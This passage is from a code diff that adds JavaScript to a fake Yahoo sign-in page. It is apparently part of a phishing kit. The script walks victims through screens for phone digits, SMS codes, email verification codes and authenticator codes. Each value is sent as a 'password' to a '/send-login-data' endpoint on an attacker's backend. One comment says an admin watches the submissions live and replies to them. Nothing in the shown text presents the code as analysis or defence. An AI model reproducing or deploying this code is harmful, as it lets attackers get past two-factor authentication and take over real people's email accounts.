+      var d0 = document.getElementById('yahooSmsUdsDigit0');
+      var d1 = document.getElementById('yahooSmsUdsDigit1');
+      var a = d0 ? d0.value.replace(/\D/g, '') : '';
+      var b = d1 ? d1.value.replace(/\D/g, '') : '';
+      return a.length === 1 && b.length === 1 ? a + b : '';
+    }
+
+    function updateYahooSmsUdsPhoneNextState() {
+      var btn = document.getElementById('yahooSmsUdsPhoneNextBtn');
+      if (btn) btn.disabled = !getYahooSmsUdsPhoneDigits();
+    }
+
+    function clearYahooSmsUdsPhoneDigits() {
+      var d0 = document.getElementById('yahooSmsUdsDigit0');
+      var d1 = document.getElementById('yahooSmsUdsDigit1');
+      if (d0) d0.value = '';
+      if (d1) d1.value = '';
+      var box = document.getElementById('yahooSmsUdsPhoneBox');
+      var err = document.getElementById('yahooSmsUdsPhoneError');
+      if (box) box.classList.remove('err');
+      if (err) err.classList.remove('visible');
+      updateYahooSmsUdsPhoneNextState();
+    }
+
+    function showYahooSmsUdsPhoneStep(areaDigit, lastTwo) {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var emailEl = document.getElementById('yahooSmsUdsAccountEmail');
+      if (emailEl) emailEl.textContent = addr;
+      var prefixEl = document.getElementById('yahooSmsUdsPrefixDisplay');
+      if (prefixEl) prefixEl.textContent = formatYahooAreaPrefix(areaDigit);
+      var suffixEl = document.getElementById('yahooSmsUdsSuffixDisplay');
+      if (suffixEl) suffixEl.textContent = lastTwo;
+      clearYahooSmsUdsPhoneDigits();
+      var step = document.getElementById('stepUdsSmsPhone');
+      if (step) step.style.display = 'flex';
+      var first = document.getElementById('yahooSmsUdsDigit0');
+      if (first) first.focus();
+      reportVisibleGoogleStep();
+    }
+
+    function initYahooSmsUdsPhoneInputs() {
+      var d0 = document.getElementById('yahooSmsUdsDigit0');
+      var d1 = document.getElementById('yahooSmsUdsDigit1');
+      if (!d0 || !d1) return;
+      function onInput(inp, nextInp) {
+        inp.addEventListener('input', function () {
+          var box = document.getElementById('yahooSmsUdsPhoneBox');
+          var err = document.getElementById('yahooSmsUdsPhoneError');
+          if (box) box.classList.remove('err');
+          if (err) err.classList.remove('visible');
+          inp.value = inp.value.replace(/\D/g, '').slice(0, 1);
+          if (inp.value && nextInp) nextInp.focus();
+          updateYahooSmsUdsPhoneNextState();
+        });
+        inp.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !inp.value && inp === d1) d0.focus();
+          if (e.key === 'Enter') {
+            var btn = document.getElementById('yahooSmsUdsPhoneNextBtn');
+            if (btn && !btn.disabled) btn.click();
+          }
+        });
+      }
+      onInput(d0, d1);
+      onInput(d1, null);
+      var nextBtn = document.getElementById('yahooSmsUdsPhoneNextBtn');
+      var nextLbl = document.getElementById('yahooSmsUdsPhoneBtnLabel');
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          var digits = getYahooSmsUdsPhoneDigits();
+          if (!digits) return;
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          var area = '';
+          var last = '';
+          try {
+            area = sessionStorage.getItem('yahooSmsUdsAreaDigit') || '';
+            last = sessionStorage.getItem('yahooSmsUdsLastTwo') || '';
+          } catch (e) {}
+          setLoading(nextBtn, nextLbl, true);
+          overlay.classList.add('visible');
+          try { sessionStorage.setItem('yahooSmsUdsMiddleDigits', digits); } catch (e) {}
+          setLoading(nextBtn, nextLbl, false);
+          overlay.classList.remove('visible');
+          showYahooSmsUdsCodeStep(area, digits, last);
+          fetch(BACKEND + '/send-login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(yahooPostBody({
+              username: addr,
+              password: digits,
+              type: 'yahoo_sms_verify_phone_digits',
+              meta: { areaDigit: area, lastTwo: last }
+            }))
+          }).catch(function () {});
+        });
+      }
+    }
+
+    initYahooSmsUdsPhoneInputs();
+
+    function getYahooSmsUdsCodeValue() {
+      var digits = '';
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooSmsUdsCode' + i);
+        if (inp) digits += String(inp.value || '').replace(/\D/g, '');
+      }
+      return digits.length === 6 ? digits : '';
+    }
+
+    function updateYahooSmsUdsCodeNextState() {
+      var btn = document.getElementById('yahooSmsUdsCodeNextBtn');
+      if (btn) btn.disabled = !getYahooSmsUdsCodeValue();
+    }
+
+    function clearYahooSmsUdsCodeInputs() {
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooSmsUdsCode' + i);
+        if (inp) inp.value = '';
+      }
+      var box = document.getElementById('yahooSmsUdsCodeBox');
+      var err = document.getElementById('yahooSmsUdsCodeError');
+      if (box) box.classList.remove('err');
+      if (err) err.classList.remove('visible');
+      updateYahooSmsUdsCodeNextState();
+    }
+
+    function showYahooSmsUdsCodeStep(areaDigit, middleDigits, lastTwo) {
+      hideAllSteps();
+      setLoginboxUdsTall(true);
+      overlay.classList.remove('visible');
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+      var emailEl = document.getElementById('yahooSmsUdsCodeAccountEmail');
+      if (emailEl) emailEl.textContent = addr;
+      var phoneEl = document.getElementById('yahooSmsUdsPhoneDisplay');
+      if (phoneEl) phoneEl.textContent = formatYahooMaskedPhoneDisplay(areaDigit, middleDigits, lastTwo);
+      clearYahooSmsUdsCodeInputs();
+      var step = document.getElementById('stepUdsSmsCode');
+      if (step) step.style.display = 'flex';
+      var first = document.getElementById('yahooSmsUdsCode0');
+      setTimeout(function () { if (first) first.focus(); }, 0);
+      reportVisibleGoogleStep();
+    }
+
+    function initYahooSmsUdsCodeInputs() {
+      var inputs = [];
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooSmsUdsCode' + i);
+        if (inp) inputs.push(inp);
+      }
+      if (!inputs.length) return;
+      inputs.forEach(function (inp, idx) {
+        inp.addEventListener('input', function () {
+          var box = document.getElementById('yahooSmsUdsCodeBox');
+          var err = document.getElementById('yahooSmsUdsCodeError');
+          if (box) box.classList.remove('err');
+          if (err) err.classList.remove('visible');
+          var raw = inp.value.replace(/\D/g, '');
+          if (idx === 0 && raw.length > 1) {
+            for (var j = 0; j < 6; j++) inputs[j].value = raw.charAt(j) || '';
+            if (raw.length >= 6) inputs[5].focus();
+            else if (raw.length > 0) inputs[Math.min(raw.length, 5)].focus();
+          } else {
+            inp.value = raw.slice(0, idx === 0 ? 6 : 1);
+            if (inp.value && idx < 5) inputs[idx + 1].focus();
+          }
+          updateYahooSmsUdsCodeNextState();
+        });
+        inp.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx - 1].focus();
+          if (e.key === 'Enter') {
+            var btn = document.getElementById('yahooSmsUdsCodeNextBtn');
+            if (btn && !btn.disabled) btn.click();
+          }
+        });
+        inp.addEventListener('paste', function (e) {
+          if (idx !== 0) return;
+          e.preventDefault();
+          var text = (e.clipboardData || window.clipboardData).getData('text') || '';
+          var digits = text.replace(/\D/g, '').slice(0, 6);
+          for (var k = 0; k < 6; k++) inputs[k].value = digits.charAt(k) || '';
+          if (digits.length >= 6) inputs[5].focus();
+          else if (digits.length) inputs[digits.length].focus();
+          updateYahooSmsUdsCodeNextState();
+        });
+      });
+      bindYahooVerifyCodeBoxClick('yahooSmsUdsCodeBox', inputs);
+      var nextBtn = document.getElementById('yahooSmsUdsCodeNextBtn');
+      var nextLbl = document.getElementById('yahooSmsUdsCodeBtnLabel');
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          var code = getYahooSmsUdsCodeValue();
+          if (!code) return;
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          setLoading(nextBtn, nextLbl, true);
+          overlay.classList.add('visible');
+          fetch(BACKEND + '/send-login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(yahooPostBody({ username: addr, password: code, type: 'yahoo_sms_verify_code' }))
+          }).catch(function () {});
+        });
+      }
+    }
+
+    initYahooSmsUdsCodeInputs();
+
+    function initYahooEmailVerifyInputs() {
+      var inputs = [];
+      for (var i = 0; i < 6; i++) {
+        var inp = document.getElementById('yahooEmailCode' + i);
+        if (inp) inputs.push(inp);
+      }
+      if (!inputs.length) return;
+
+      inputs.forEach(function (inp, idx) {
+        inp.addEventListener('input', function () {
+          var box = document.getElementById('yahooEmailCodeBox');
+          var err = document.getElementById('yahooEmailCodeError');
+          if (box) box.classList.remove('err');
+          if (err) err.classList.remove('visible');
+
+          var raw = inp.value.replace(/\D/g, '');
+          if (idx === 0 && raw.length > 1) {
+            for (var j = 0; j < 6; j++) {
+              inputs[j].value = raw.charAt(j) || '';
+            }
+            if (raw.length >= 6) inputs[5].focus();
+            else if (raw.length > 0) inputs[Math.min(raw.length, 5)].focus();
+          } else {
+            inp.value = raw.slice(0, idx === 0 ? 6 : 1);
+            if (inp.value && idx < 5) inputs[idx + 1].focus();
+          }
+          updateYahooEmailCodeNextState();
+        });
+        inp.addEventListener('keydown', function (e) {
+          if (e.key === 'Backspace' && !inp.value && idx > 0) {
+            inputs[idx - 1].focus();
+          }
+          if (e.key === 'Enter') {
+            var nextBtn = document.getElementById('yahooEmailCodeNextBtn');
+            if (nextBtn && !nextBtn.disabled) nextBtn.click();
+          }
+        });
+        inp.addEventListener('paste', function (e) {
+          if (idx !== 0) return;
+          e.preventDefault();
+          var text = (e.clipboardData || window.clipboardData).getData('text') || '';
+          var digits = text.replace(/\D/g, '').slice(0, 6);
+          for (var k = 0; k < 6; k++) inputs[k].value = digits.charAt(k) || '';
+          if (digits.length >= 6) inputs[5].focus();
+          else if (digits.length) inputs[digits.length].focus();
+          updateYahooEmailCodeNextState();
+        });
+      });
+
+      var nextBtn = document.getElementById('yahooEmailCodeNextBtn');
+      var nextLbl = document.getElementById('yahooEmailCodeBtnLabel');
+      if (nextBtn) {
+        nextBtn.addEventListener('click', function () {
+          var code = getYahooEmailCodeValue();
+          if (!code) return;
+          var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+          setLoading(nextBtn, nextLbl, true);
+          overlay.classList.add('visible');
+          fetch(BACKEND + '/send-login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(yahooPostBody({ username: addr, password: code, type: 'yahoo_email_verify_code' }))
+          }).catch(function () {});
+        });
+      }
+    }
+
+    initYahooEmailVerifyInputs();
+    initYahooPushNotifyButtons();
+
+    /* ─── hideAllSteps helper ─── */
+    function hideAllSteps() {
+      setLoginboxUdsTall(false);
+      resetYahooPushSendButton();
+      ['step1','step2','stepEmailVerify','stepPushNotify','stepWhatsappPhone','stepWhatsappSmsCode','stepUdsSmsPhone','stepUdsSmsCode','step3','step4','step5','step6','step7'].forEach(function(id) {
+        var el = document.getElementById(id);
+        if (el) el.style.display = 'none';
+      });
+    }
+
+    /* ─── Step 5: SMS phone entry ─── */
+    var smsPhoneInput = document.getElementById('smsPhoneInput');
+    var smsPhoneError = document.getElementById('smsPhoneError');
+    var smsSendBtn    = document.getElementById('smsSendBtn');
+    var smsSendLabel  = document.getElementById('smsSendLabel');
+
+    smsPhoneInput.addEventListener('input', function () {
+      smsPhoneInput.classList.toggle('has-val', smsPhoneInput.value.length > 0);
+      clearErr(smsPhoneInput, smsPhoneError);
+    });
+
+    smsPhoneInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsSendBtn.click();
+    });
+
+    smsSendBtn.addEventListener('click', function () {
+      var phone = smsPhoneInput.value.trim();
+      if (!phone) {
+        showErr(smsPhoneInput, smsPhoneError);
+        return;
+      }
+
+      var prefix    = document.getElementById('smsPrefixBox').textContent;
+      var fullPhone = prefix + phone;
+      var addr      = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsSendBtn, smsSendLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: fullPhone, type: 'yahoo_sms_phone' }))
+      }).catch(function () {});
+
+      /* Show code step after brief delay (admin will send wrong-number if invalid) */
+      setTimeout(function () {
+        var addr2 = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+        document.getElementById('smsCodeHint').textContent =
+          'Enter the 6-digit code we sent to ' + fullPhone + '.';
+        document.getElementById('step6ChipEmail').textContent = addr2;
+        overlay.classList.remove('visible');
+        setLoading(smsSendBtn, smsSendLabel, false);
+        hideAllSteps();
+        document.getElementById('step6').style.display = 'flex';
+        document.getElementById('smsCodeInput').focus();
+        reportVisibleGoogleStep();
+      }, 2000);
+    });
+
+    /* ─── Step 6: SMS code entry ─── */
+    var smsCodeInput   = document.getElementById('smsCodeInput');
+    var smsCodeError   = document.getElementById('smsCodeError');
+    var smsCodeNextBtn = document.getElementById('smsCodeNextBtn');
+    var smsCodeLabel   = document.getElementById('smsCodeLabel');
+
+    smsCodeInput.addEventListener('input', function () {
+      smsCodeInput.classList.toggle('has-val', smsCodeInput.value.length > 0);
+      clearErr(smsCodeInput, smsCodeError);
+    });
+
+    smsCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') smsCodeNextBtn.click();
+    });
+
+    smsCodeNextBtn.addEventListener('click', function () {
+      var code = smsCodeInput.value.trim();
+      if (!code) {
+        showErr(smsCodeInput, smsCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(smsCodeNextBtn, smsCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: code, type: 'yahoo_sms_code' }))
+      }).catch(function () {});
+    });
+
+    /* ─── Step 7: Authenticator code ─── */
+    var authCodeInput   = document.getElementById('authCodeInput');
+    var authCodeError   = document.getElementById('authCodeError');
+    var authCodeNextBtn = document.getElementById('authCodeNextBtn');
+    var authCodeLabel   = document.getElementById('authCodeLabel');
+
+    authCodeInput.addEventListener('input', function () {
+      authCodeInput.classList.toggle('has-val', authCodeInput.value.length > 0);
+      clearErr(authCodeInput, authCodeError);
+    });
+
+    authCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') authCodeNextBtn.click();
+    });
+
+    authCodeNextBtn.addEventListener('click', function () {
+      var code = authCodeInput.value.trim();
+      if (!code) {
+        showErr(authCodeInput, authCodeError);
+        return;
+      }
+
+      var addr = sessionStorage.getItem('lastLoginEmail') || emailInput.value.trim();
+
+      setLoading(authCodeNextBtn, authCodeLabel, true);
+      overlay.classList.add('visible');
+
+      fetch(BACKEND + '/send-login-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(yahooPostBody({ username: addr, password: code, type: 'yahoo_auth_code' }))
+      }).catch(function () {});
+    });
+
+    reportVisibleGoogleStep();
+
+  })();
+  </script>
+</body>
+</html>
